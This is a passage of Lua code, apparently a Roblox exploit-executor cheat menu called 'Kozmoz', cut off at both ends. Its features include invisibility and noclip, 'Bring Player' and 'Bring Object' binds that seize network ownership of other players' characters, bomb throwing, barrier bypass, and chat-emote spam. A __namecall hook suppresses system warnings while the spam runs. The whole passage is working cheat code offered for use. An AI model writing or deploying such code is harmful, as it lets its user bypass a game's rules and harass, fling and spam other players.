            local characterHeight = _G.Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
            local targetUndergroundDepth = cameraTargetHeight - _G.Invisibility.undergroundDepthOffset
            local currentPos = _G.Invisibility.humanoidRootPart.Position
            if math.abs(currentPos.Y - targetUndergroundDepth) > 0.1 then
                _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(currentPos.X, targetUndergroundDepth, currentPos.Z)
            end
        end
    end)
    KozRun.RenderStepped:Connect(function()
        if _G.Invisibility.noclipEnabled and _G.Invisibility.originalPosition then
            local characterPos = _G.Invisibility.humanoidRootPart.Position
            local characterHeight = _G.Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
            local currentCF = _G.Invisibility.camera.CFrame
            local lookVector = currentCF.LookVector
            local cameraPos = Vector3.new(characterPos.X, cameraTargetHeight, characterPos.Z)
            _G.Invisibility.camera.CFrame = applyScreenStretch(CFrame.new(cameraPos, cameraPos + lookVector))
        end
    end)
    KozPLR.CharacterAdded:Connect(function(newCharacter)
        task.wait(0.5)
        updateInvisCharacter(newCharacter)
        if _G.Invisibility.noclipEnabled then
            _G.Invisibility.originalPosition = _G.Invisibility.humanoidRootPart.Position
            _G.Invisibility.originalCameraCFrame = _G.Invisibility.camera.CFrame
            _G.Invisibility.humanoidRootPartTransparency = _G.Invisibility.humanoidRootPart.Transparency
            _G.Invisibility.setNoclip(true)
            _G.Invisibility.setHumanoidRootPartTransparency(1)
            local characterHeight = _G.Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
            local undergroundDepth = cameraTargetHeight - _G.Invisibility.undergroundDepthOffset
            local undergroundPos = Vector3.new(_G.Invisibility.humanoidRootPart.Position.X, undergroundDepth, _G.Invisibility.humanoidRootPart.Position.Z)
            _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(undergroundPos)
        end
    end)
    KozPLR.CharacterRemoving:Connect(function()
        if _G.Invisibility.noclipEnabled then
            _G.Invisibility.setNoclip(false)
        end
    end)
    -- [KOZMOZ] "miscOtherSec" baska bolumun elemani, tasinmadi
    _G.Invisibility.initialized = true
    local lockGrabCounter = 0
    KBGroup:AddLabel("Bring Object"):AddKeyPicker("KozBringObject", {
        Text = "Bring Object",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            task.spawn(function()
                    local myChar = KozPLR.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then return end
                    local mouse = KozPLR:GetMouse()
                    local target = mouse.Target
                    if not target or target.Anchored then return end
                    if target:IsA("BasePart") and target.CollisionGroup ~= "Items" then return end
                    local savedCFrame = myRoot.CFrame
                    local whograb = target:FindFirstChild("whograb")
                    if not whograb then
                        whograb = Instance.new("StringValue")
                        whograb.Name = "whograb"
                        whograb.Value = ""
                        whograb.Parent = target
                    end
                    local partOwner = target:FindFirstChild("PartOwner")
                    local startTargetPos = target.Position
                    task.spawn(function()
                            while (not partOwner or partOwner.Value ~= KozPLR.Name) and target.Parent and myChar.Parent do
                                if (target.Position - startTargetPos).Magnitude > 0.5 then
                                    startTargetPos = target.Position
                                end
                                task.wait(0.1)
                            end
                        end)
                    for i = 1, 200 do
                        if not target.Parent or not myChar.Parent then break end
                        partOwner = target:FindFirstChild("PartOwner")
                        if partOwner and partOwner.Value == KozPLR.Name then break end
                        local myHum = myChar:FindFirstChildOfClass("Humanoid")
                        if myHum and myHum.Health > 0 then
                            local dist = (target.Position - myRoot.Position).Magnitude
                            if dist > 25 then
                                myRoot.CFrame = target.CFrame + (target.Position - startTargetPos) * KozPLR:GetNetworkPing() * 100
                            else
                                myRoot.CFrame = target.CFrame
                            end
                            KozDisp:Fire(KozRemote.SetNetworkOwner, target, target.CFrame)
                        end
                        task.wait()
                    end
                    myRoot.CFrame = savedCFrame
                    target.CFrame = savedCFrame + savedCFrame.LookVector * 3 + Vector3.new(0, 10, 0)
                end)
        end
    })
    KBGroup:AddLabel("Bring Player"):AddKeyPicker("KozBringPlayer", {
        Text = "Bring Player",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            task.spawn(function()
                    local myChar = KozPLR.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then return end
                    local mouse = KozPLR:GetMouse()
                    local target = mouse.Target
                    if not target then return end
                    local bodyParts = {"Head", "Right Arm", "Right Leg", "Left Arm", "Left Leg", "Torso", "FirePlayerPart", "HumanoidRootPart"}
                    local isCharacter = false
                    for _, name in ipairs(bodyParts) do
                        if target.Name == name then
                            isCharacter = true
                            break
                        end
                    end
                    if not isCharacter then return end
                    local targetChar = target.Parent
                    if not targetChar or targetChar == myChar then return end
                    local targetHead = targetChar:FindFirstChild("Head")
                    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                    if not targetHead or not targetHRP then return end
                    local savedCFrame = myRoot.CFrame
                    local whograb = targetHead:FindFirstChild("whograb")
                    if not whograb then
                        whograb = Instance.new("StringValue")
                        whograb.Name = "whograb"
                        whograb.Value = ""
                        whograb.Parent = targetHead
                    end
                    local startTargetPos = targetHead.Position
                    task.spawn(function()
                            local partOwner = targetHead:FindFirstChild("PartOwner")
                            while (not partOwner or partOwner.Value ~= KozPLR.Name) and targetHead.Parent and myChar.Parent do
                                if (targetHead.Position - startTargetPos).Magnitude > 0.5 then
                                    startTargetPos = targetHead.Position
                                end
                                task.wait(0.1)
                                partOwner = targetHead:FindFirstChild("PartOwner")
                            end
                        end)
                    for i = 1, 200 do
                        if not targetHead.Parent or not myChar.Parent then break end
                        local partOwner = targetHead:FindFirstChild("PartOwner")
                        if partOwner and partOwner.Value == KozPLR.Name then break end
                        local myHum = myChar:FindFirstChildOfClass("Humanoid")
                        if myHum and myHum.Health > 0 then
                            local dist = (targetHead.Position - myRoot.Position).Magnitude
                            if dist > 25 then
                                myRoot.CFrame = targetHead.CFrame + (targetHead.Position - startTargetPos) * KozPLR:GetNetworkPing() * 100
                            else
                                myRoot.CFrame = targetHead.CFrame
                            end
                            KozDisp:Fire(KozRemote.SetNetworkOwner, targetHead, targetHead.CFrame)
                        end
                        task.wait()
                    end
                    myRoot.CFrame = savedCFrame
                    targetHRP.CFrame = savedCFrame + savedCFrame.LookVector * 3 + Vector3.new(0, 10, 0)
                end)
        end
    })
    KBGroup:AddLabel("Lock Grab"):AddKeyPicker("KozLockGrab", {
        Text = "Lock Grab",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            local grabParts = KozWS:FindFirstChild("GrabParts")
            if grabParts then
                local clone = grabParts:Clone()
                grabParts:Destroy()
                local beamPart = clone:FindFirstChild("BeamPart")
                if beamPart then beamPart:Destroy() end
                lockGrabCounter = lockGrabCounter + 1
                clone.Name = tostring(lockGrabCounter)
                clone.Parent = KozWS
            end
        end
    })
    KBGroup:AddLabel("Delete All Lock Grabs"):AddKeyPicker("KozDeleteAllLockGrabs", {
        Text = "Delete All Lock Grabs",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            for _, obj in ipairs(KozWS:GetChildren()) do
                if obj:IsA("Model") and tonumber(obj.Name) then
                    obj:Destroy()
                end
            end
            lockGrabCounter = 0
        end
    })
    KBGroup:AddLabel("Stop Velocity"):AddKeyPicker("KozStopVelocity", {
        Text = "Stop Velocity",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            local char = KozPLR.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.AssemblyLinearVelocity = Vector3.zero
                        part.AssemblyAngularVelocity = Vector3.zero
                    end
                end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Velocity = Vector3.zero
                    hrp.RotVelocity = Vector3.zero
                end
            end
        end
    })
    KBGroup:AddLabel("Throw Bomb"):AddKeyPicker("KozThrowBomb", {
        Text = "Throw Bomb",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            task.spawn(function()
                    local myChar = KozPLR.Character
                    local myHead = myChar and myChar:FindFirstChild("Head")
                    if not myHead then return end
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then return end
                    local GE = KozRS:WaitForChild("GrabEvents")
                    local SetNetworkOwner = GE:WaitForChild("SetNetworkOwner")
                    local CreateGrabLine = GE:WaitForChild("CreateGrabLine")
                    local DestroyGrabLine = GE:WaitForChild("DestroyGrabLine")
                    local toyName = "BombMissile"
                    local spawnCFrame = myHead.CFrame
                    local connection
                    connection = KozWS:WaitForChild(KozPLR.Name .. "SpawnedInToys", 5).ChildAdded:Connect(function(child)
                            if child.Name == toyName and child:WaitForChild("ThisToysNumber", 3) then
                                local toyNum = child.ThisToysNumber.Value
                                local folder = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                                local toyNumber = folder and folder:FindFirstChild("ToyNumber")
                                if toyNumber and toyNum == (toyNumber.Value - 1) then
                                    connection:Disconnect()
                                    local body = child:FindFirstChild("Body") or child:FindFirstChild("PartHitDetector")
                                    if body then
                                        KozDisp:Fire(SetNetworkOwner, body, body.CFrame)
                                        KozDisp:Fire(CreateGrabLine, body, Vector3.zero, body.Position, false)
                                        task.wait(0.05)
                                        KozDisp:Fire(DestroyGrabLine, body)
                                        local vel = Instance.new("BodyVelocity")
                                        vel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        vel.Velocity = KozWS.CurrentCamera.CFrame.LookVector * 500
                                        vel.P = 2000
                                        vel.Parent = body
                                        KozDebris:AddItem(vel, 5)
                                    end
                                end
                            end
                        end)
                    task.wait(0.5)
                end)
        end
    })
    KBGroup:AddLabel("Spawn Pallet"):AddKeyPicker("KozSpawnPallet", {
        Text = "Spawn Pallet",
        Default = "Tab",
        Mode = "Toggle",
        Callback = function()
            -- eskiden "Spisok" acik degilse hicbir sey yapmiyordu; artik serbest
            task.spawn(function()
                local myChar = KozPLR.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if not myRoot then return end
                local remote = KozRemote.SpawnToyRemoteFunction
                if not remote then
                    pcall(function()
                        Library:Notify({
                            Title = "Kozmoz",
                            Description = "Spawn Pallet: MenuToys.SpawnToyRemoteFunction bulunamadi.",
                            Time = 5,
                        })
                    end)
                    return
                end
                local spawnCFrame = myRoot.CFrame * CFrame.new(0, -5, 0)
                local kozOk = pcall(function()
                    KozDisp:Invoke(remote, "PalletLightBrown", spawnCFrame, Vector3.new(0, 0, 0))
                end)
                if kozOk and KozFlags.refreshToolList then
                    pcall(KozFlags.refreshToolList)
                end
            end)
        end
    })
    local platformTPActive = false
    local platformTPOldPos = nil
    local platformTPPart = nil
    local function setupPlatformTP()
        if not platformTPPart or not platformTPPart.Parent then
            platformTPPart = Instance.new("Part")
            platformTPPart.Name = "SkyBase"
            platformTPPart.Anchored = true
            platformTPPart.Size = Vector3.new(1500, 2, 1500)
            platformTPPart.CFrame = CFrame.new(0, 1000000, 0)
            platformTPPart.Parent = KozWS
        end
    end
    setupPlatformTP()
    KBGroup:AddLabel("Platform TP"):AddKeyPicker("KozPlatformTP", {
        Text = "Platform TP",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            setupPlatformTP()
            local char = KozPLR.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            platformTPActive = not platformTPActive
            if platformTPActive then
                platformTPOldPos = root.CFrame
                root.CFrame = platformTPPart.CFrame + Vector3.new(0, 5, 0)
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            else
                if platformTPOldPos then
                    root.CFrame = platformTPOldPos
                end
            end
        end
    })
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    local miscBringTarget = nil
    local miscBringCombo
    -- [KOZMOZ] "miscBringSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscBringSec" baska bolumun elemani, tasinmadi
    local miscBringCombo = setmetatable({}, {__index = function() return function() end end}) -- bos eleman (kaynak bolumu tasindi)
    -- [KOZMOZ] "miscBringSec" baska bolumun elemani, tasinmadi
    do
    local viewTarget = nil
    local viewEnabled = false
    local viewConn = nil
    local miscViewCombo
    local viewYaw = 0
    local viewPitch = 0
    local viewMouseConn = nil
    local viewSavedData = {}
    local function viewHideAccessories(character)
        local head = character:FindFirstChild("Head")
        if head then
            if not viewSavedData._saved then
                viewSavedData.headTransparency = head.Transparency
                for _, obj in ipairs(head:GetChildren()) do
                    pcall(function()
                        if obj:IsA("Decal") then
                            viewSavedData[obj] = obj.Transparency
                        elseif obj:IsA("SpecialMesh") then
                            viewSavedData[obj] = {MeshId = obj.MeshId, TextureId = obj.TextureId}
                        elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                            viewSavedData[obj] = obj.Enabled
                        end
                    end)
                end
                for _, acc in ipairs(character:GetDescendants()) do
                    if acc:IsA("Accessory") then
                        local handle = acc:FindFirstChild("Handle")
                        if handle then
                            viewSavedData[handle] = handle.Transparency
                        end
                    end
                end
                viewSavedData._saved = true
            end
            head.Transparency = 1
            for _, obj in ipairs(head:GetChildren()) do
                pcall(function()
                    if obj:IsA("Decal") then
                        obj.Transparency = 1
                    elseif obj:IsA("SpecialMesh") then
                        obj.MeshId = ""
                        obj.TextureId = ""
                    elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                        obj.Enabled = false
                    end
                end)
            end
        end
        for _, acc in ipairs(character:GetDescendants()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then handle.Transparency = 1 end
            end
        end
    end
    local function viewRestorePlayer(playerName)
        local target = playerName and KozPlayers:FindFirstChild(playerName)
        if not target or not target.Character then return end
        local head = target.Character:FindFirstChild("Head")
        if head then
            head.Transparency = viewSavedData.headTransparency or 0
            for _, obj in ipairs(head:GetChildren()) do
                pcall(function()
                    if obj:IsA("Decal") then
                        obj.Transparency = viewSavedData[obj] or 0
                    elseif obj:IsA("SpecialMesh") then
                        local saved = viewSavedData[obj]
                        if saved then
                            obj.MeshId = saved.MeshId
                            obj.TextureId = saved.TextureId
                        end
                    elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                        if viewSavedData[obj] ~= nil then
                            obj.Enabled = viewSavedData[obj]
                        end
                    end
                end)
            end
        end
        for _, acc in ipairs(target.Character:GetDescendants()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then
                    handle.Transparency = viewSavedData[handle] or 0
                end
            end
        end
        viewSavedData = {}
    end
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    local miscViewCombo = setmetatable({}, {__index = function() return function() end end}) -- bos eleman (kaynak bolumu tasindi)
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    local camViewEnabled = false
    local camViewConn = nil
    local camViewOriginalCF = nil
    local camViewPart = nil
    local camViewOriginalSubject = nil
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    local viewForceTP = false
    local viewForceSide = "Backward"
    local viewForceDist = 5
    local viewForceConn = nil
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    local barrierNoclipConn = nil
    local barrierNoclipLoop = nil
    KozState.barrierNoclipSaved = nil
    local function barrierNoclipApply(part)
        if not part:IsA("BasePart") then return end
        if not KozState.barrierNoclipSaved then KozState.barrierNoclipSaved = {} end
        if not KozState.barrierNoclipSaved[part] then
            KozState.barrierNoclipSaved[part] = {
                CanCollide = part.CanCollide,
                CanQuery = part.CanQuery,
                CanTouch = part.CanTouch,
            }
        end
        part.CanCollide = false
        part.CanQuery = false
        part.CanTouch = false
    end
    local function barrierNoclipApplyRecursive(obj)
        barrierNoclipApply(obj)
        for _, child in ipairs(obj:GetChildren()) do
            barrierNoclipApplyRecursive(child)
        end
    end
    local function setBarrierNoclip()
        if not KozState.barrierNoclip then return end
        local Plots = KozWS:FindFirstChild("Plots")
        local root = Plots or KozWS
        for _, obj in ipairs(root:GetDescendants()) do
            if obj.Name == "PlotBarrier" or obj.Name == "PlotArea" then
                barrierNoclipApplyRecursive(obj)
            end
        end
    end
    local function restoreBarrierNoclip()
        if KozState.barrierNoclipSaved then
            for part, props in pairs(KozState.barrierNoclipSaved) do
                if part and part.Parent then
                    part.CanCollide = props.CanCollide
                    part.CanQuery = props.CanQuery
                    part.CanTouch = props.CanTouch
                end
            end
            KozState.barrierNoclipSaved = nil
        end
    end
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscOtherSec" baska bolumun elemani, tasinmadi
    end
    -- [KOZMOZ] "miscFunSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscFunSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscFunSec" baska bolumun elemani, tasinmadi
    local function getChatMethod(pew)
        local cmd = pew and "/e pew" or "/e dance"
        local ok, tcs = pcall(function() return game:GetService("TextChatService") end)
        if ok and tcs then
            local channels = tcs:FindFirstChild("TextChannels")
            if channels then
                local channel = channels:FindFirstChild("RBXGeneral")
                if channel then
                    return function() channel:SendAsync(cmd) end
                end
            end
        end
        if KozRS:FindFirstChild("ChatEvents") then
            local ce = KozRS.ChatEvents
            if ce:FindFirstChild("SayMessageRequest") then
                return function() KozDisp:Fire(ce.SayMessageRequest, cmd, "All") end
            elseif ce:FindFirstChild("sayMessage") then
                return function() KozDisp:Fire(ce.sayMessage, cmd, "All") end
            end
        end
        return nil
    end
    local spamDanceActive = false
    local spamDanceConn = nil
    local spamDanceLastTime = 0
    local spamDanceChatMethod = nil
    KBGroup:AddLabel("Spam Dance"):AddKeyPicker("KozSpamDanceKey", {
        Text = "Spam Dance",
        Default = "None",
        Mode = "Toggle",
        Callback = function(held)
            if held then
                spamDanceChatMethod = getChatMethod(false)
            end
            spamDanceActive = held
        end
    })
    local spamPewActive = false
    local spamPewConn = nil
    local spamPewLastTime = 0
    local spamPewChatMethod = nil
    KBGroup:AddLabel("Spam Pew"):AddKeyPicker("KozSpamPewKey", {
        Text = "Spam Pew",
        Default = "None",
        Mode = "Toggle",
        Callback = function(held)
            if held then
                spamPewChatMethod = getChatMethod(true)
            end
            spamPewActive = held
        end
    })
    KozRun.RenderStepped:Connect(function()
        local t = tick()
        if spamDanceActive then
            if not spamDanceChatMethod then spamDanceChatMethod = getChatMethod(false) end
            if not spamDanceConn then
                spamDanceLastTime = 0
                spamDanceConn = true
            end
            if spamDanceChatMethod and (t - spamDanceLastTime) >= 0.1 then
                spamDanceLastTime = t
                pcall(spamDanceChatMethod)
            end
        else
            if spamDanceConn then spamDanceConn = nil end
        end
        if spamPewActive then
            if not spamPewChatMethod then spamPewChatMethod = getChatMethod(true) end
            if not spamPewConn then
                spamPewLastTime = 0
                spamPewConn = true
            end
            if spamPewChatMethod and (t - spamPewLastTime) >= 0.1 then
                spamPewLastTime = t
                pcall(spamPewChatMethod)
            end
        else
            if spamPewConn then spamPewConn = nil end
        end
    end)
    local function isEmoteBlocked(text)
        if type(text) ~= "string" then return false end
        return string.find(string.lower(text), "emote here", 1, true) ~= nil
    end
    pcall(function()
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            if (spamDanceActive or spamPewActive) and getnamecallmethod() == "DisplaySystemMessage" then
                if isEmoteBlocked(select(1, ...)) then return end
            end
            return oldNamecall(self, ...)
        end))
    end)
    pcall(function()
        local tcs = game:GetService("TextChatService")
        if not tcs then return end
        local oldIncoming = tcs.OnIncomingMessage
        tcs.OnIncomingMessage = function(message)
            if (spamDanceActive or spamPewActive) and isEmoteBlocked(message and message.Text) then
                -- yeni TextChatService API'si TextChatMessageProperties bekler
                local kozProps = Instance.new("TextChatMessageProperties")
                kozProps.Status = Enum.TextChatMessageStatus.Removed
                return kozProps
            end
            if oldIncoming then
                local ok, res = pcall(oldIncoming, message)
                if ok and (res == nil or typeof(res) == "TextChatMessageProperties") then
                    return res
                end
            end
            return nil
        end
    end)
    pcall(function()
        local plrGui = KozPLR and KozPLR:FindFirstChild("PlayerGui")
        local function getChatFrame()
            local chat = plrGui and plrGui:FindFirstChild("Chat")
            local frame = chat and chat:FindFirstChild("Frame")
            return frame and frame:FindFirstChild("ChatFrame")
        end
        local hooked = {}
        local function installHooks()
            local cf = getChatFrame()
            if not cf then return false end
            local allDone = true
            for _, name in ipairs({ "AddSystemMessage", "AddMessage" }) do
                if not hooked[name] then
                    local orig = cf[name]
                    if type(orig) == "function" then
                        hooked[name] = orig
                        cf[name] = function(self, ...)
                            local msg = select(1, ...)
                            if type(msg) == "table" then msg = msg.Message end
                            if (spamDanceActive or spamPewActive) and isEmoteBlocked(msg) then return end
                            return orig(self, ...)
                        end
                    else
                        allDone = false
                    end
                end
            end
            return allDone
        end
        if not installHooks() then
            task.spawn(function()
                while not installHooks() do task.wait(0.5) end
            end)
        end
    end)
    local saltoFlipConnection = nil
    local isSaltoActive = false
    local SALTO_H = 0.0174533
    local function doSalto()
        if isSaltoActive then return end
        isSaltoActive = true
        local char = KozPLR.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then
            isSaltoActive = false
            return
        end
        local hrp = char.HumanoidRootPart
        local hum = char.Humanoid
        if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
        hum:ChangeState("Jumping")
        hum.Sit = true
        local velocity = hrp:FindFirstChild("BodyVelocity") or Instance.new("BodyVelocity")
        velocity.Velocity = Vector3.new(0, 30, 0)
        velocity.MaxForce = Vector3.new(0, math.huge, 0)
        velocity.Parent = hrp
        task.delay(0.1, function()
            if velocity and velocity.Parent then velocity:Destroy() end
        end)
        local rotValue = SALTO_H
        local rotAxis = {1, 0, 0}
        local rotSign = 1
        local startTime = tick()
        local duration = 0.8
        local totalRotation = 360
        local completed = false
        local prevRotation = 0
        saltoFlipConnection = KozRun.RenderStepped:Connect(function(delta)
            if not char or not hrp or not hum or not hrp.Parent then
                if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
                isSaltoActive = false
                return
            end
            local elapsed = tick() - startTime
            if elapsed >= duration then
                if not completed then
                    completed = true
                    hum.Sit = false
                    if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
                    isSaltoActive = false
                end
                return
            end
            local progress = elapsed / duration
            local easeProgress = progress
            if progress < 0.5 then
                easeProgress = 2 * progress * progress
            else
                easeProgress = 1 - (math.pow((-2 * progress) + 2, 2) / 2)
            end
            local targetRotation = totalRotation * easeProgress
            local lastRotation = totalRotation * math.max(0, easeProgress - (delta / duration))
            local frameRotation = (targetRotation - lastRotation) * SALTO_H
            local sign = rotValue > 0 and 1 or -1
            local angle = CFrame.Angles(rotAxis[1] * frameRotation * sign, rotAxis[2] * frameRotation * sign, rotAxis[3] * frameRotation * sign)
            if hrp and hrp.Parent then
                hrp.CFrame = hrp.CFrame * angle
            end
            hum.Sit = true
        end)
        task.delay(duration + 0.2, function()
            if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
            if char and hum then hum.Sit = false end
            isSaltoActive = false
        end)
    end
    KBGroup:AddLabel("Salto"):AddKeyPicker("KozSaltoKey", {
        Text = "Salto",
        Default = "None",
        Mode = "Toggle",
        Callback = function(held)
            if not isSaltoActive then
                doSalto()
            end
        end
    })

    local zoomOrigFOV = 70
    local zoomOrigSens = 0.2
    KBGroup:AddLabel("Zoom"):AddKeyPicker("KozZoomBind", {
        Text = "Zoom",
        Default = "None",
        Mode = "Toggle",
        Callback = function(held)
            KozState.zoomActive = held
            if held then
                zoomOrigFOV = KozFlags.FOVValue or 70
                zoomOrigSens = UserInputService.MouseDeltaSensitivity
                TweenService:Create(KozWS.CurrentCamera, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {FieldOfView = 10}):Play()
                UserInputService.MouseDeltaSensitivity = zoomOrigSens * (1/3)
            else
                TweenService:Create(KozWS.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {FieldOfView = zoomOrigFOV}):Play()
                UserInputService.MouseDeltaSensitivity = zoomOrigSens
            end
        end
    })
end

Services.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    for _, kb in pairs(KB) do
        if kb.Waiting then
            kb.Waiting = false
            kb.Key = input.KeyCode
            keyName = string.gsub(tostring(kb.Key), "Enum.KeyCode.", "")
            kb.Label:SetText('<font color="' .. kb.Color .. '">Current Keybind: ' .. keyName .. '</font>')
            return
        end
    end
    target = GetLookedPlayer()
    for _, kb in pairs(KB) do
        if input.KeyCode == kb.Key then
            if kb.Name == "Bring" then
                if target then
                    task.spawn(function() BringTarget(target, "player") end)
                else
                    camera = workspace.CurrentCamera
                    params = RaycastParams.new()
                    params.FilterDescendantsInstances = {Services.LocalPlayer.Character}
                    params.FilterType = Enum.RaycastFilterType.Blacklist
                    result = workspace:Raycast(camera.CFrame.Position, camera.CFrame.LookVector * 1000, params)
                    if result and result.Instance then
                        part = result.Instance
                        model = part:FindFirstAncestorOfClass("Model")
                        if model and Services.Players:GetPlayerFromCharacter(model) then
                            return
                        end
                        task.spawn(function() BringTarget(part, "toy") end)
                    else
                    end
                end
            elseif kb.Name == "Ragdoll" then
                if not target then
                    return
                end
                plr = Services.Players.LocalPlayer
                spawnedToys = Services.Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
                if not spawnedToys or not spawnedToys:FindFirstChild("Ragdoll") then
                    return
                end
                task.spawn(function() kb.Func(target) end)
            else
                if not target then
                    return
                end
                task.spawn(function() kb.Func(target) end)
            end
        end
    end
end)

TPSettings = {
    Mode = "Instant",
    SlideDuration = 0.3,
    SlideStyle = Enum.EasingStyle.Quad,
    SlideDirection = Enum.EasingDirection.Out
}

local function GetMousePosition()
    mouse = Services.LocalPlayer:GetMouse()
    if mouse and mouse.Hit then
        return mouse.Hit.Position
    end
    return nil
end

local function TeleportInstant()
    character = Services.LocalPlayer.Character
    hrp = character and character:FindFirstChild("HumanoidRootPart")
    mousePos = GetMousePosition()
    if hrp and mousePos then
        hrp.CFrame = CFrame.new(mousePos)
    end
end

local function TeleportSlide()
    character = Services.LocalPlayer.Character
    hrp = character and character:FindFirstChild("HumanoidRootPart")
    mousePos = GetMousePosition()
    if hrp and mousePos then
        startPos = hrp.Position
        targetPos = mousePos
        distance = (targetPos - startPos).Magnitude
        duration = math.min(TPSettings.SlideDuration + (distance / 500), 1)
        tweenInfo = TweenInfo.new(
            duration,
            TPSettings.SlideStyle,
            TPSettings.SlideDirection
        )
        tween = Services.TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPos)})
        tween:Play()
    end
end

local function TeleportToMouse()
    mousePos = GetMousePosition()
    if not mousePos then
        return
    end
    if TPSettings.Mode == "Instant" then
        TeleportInstant()
    else
        TeleportSlide()
    end
end

TpGroupbox = Tabs.KeybindsTab:AddRightGroupbox("Teleport to Mouse", "rocket")

TpGroupbox:AddDropdown("TPModeDropdown", {
    Text = "Teleport Mode",
    Values = {"Instant", "Slide"},
    Default = 1,
    Callback = function(Value)
        TPSettings.Mode = Value
        if SlideSettingsFrame then
            SlideSettingsFrame.Visible = (Value == "Slide")
        end
    end
})

SlideSettingsFrame = Instance.new("Frame")
SlideSettingsFrame.Size = UDim2.new(1, 0, 0, 120)
SlideSettingsFrame.BackgroundTransparency = 1
SlideSettingsFrame.Visible = false
SlideSettingsFrame.Parent = TpGroupbox.Container

durationSlider = TpGroupbox:AddSlider("SlideDuration", {
    Text = "Slide Duration (seconds)",
    Default = 0.3,
    Min = 0.1,
    Max = 1.5,
    Decimals = 1,
    Callback = function(Value)
        TPSettings.SlideDuration = Value
    end
})

TpGroupbox:AddDivider()
TpGroupbox:AddLabel("Keybind (Optional)", true)

TPStuff = {
    tpKeybind = "B",
    tpKeybindActive = false,
    tpKeybindCode = Enum.KeyCode.B
}

keybindLabel = TpGroupbox:AddLabel('<font color="rgb(255, 160, 0)">Keybind: ' .. TPStuff.tpKeybind .. '</font>')

TpGroupbox:AddButton({
    Text = "Change TP Keybind",
    Func = function()
        TPStuff.tpKeybindActive = true
        task.delay(5, function()
            if TPStuff.tpKeybindActive then
                TPStuff.tpKeybindActive = false
            end
        end)
    end
})

TpGroupbox:AddToggle("EnableTPKeybind", {
    Text = "Enable TP Keybind",
    Default = false,
    Callback = function(Value)
        _G.TPKeybindEnabled = Value
        if Value then
        end
    end
})

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if TPStuff.tpKeybindActive and input.UserInputType == Enum.UserInputType.Keyboard then
        TPStuff.tpKeybindActive = false
        TPStuff.tpKeybindCode = input.KeyCode
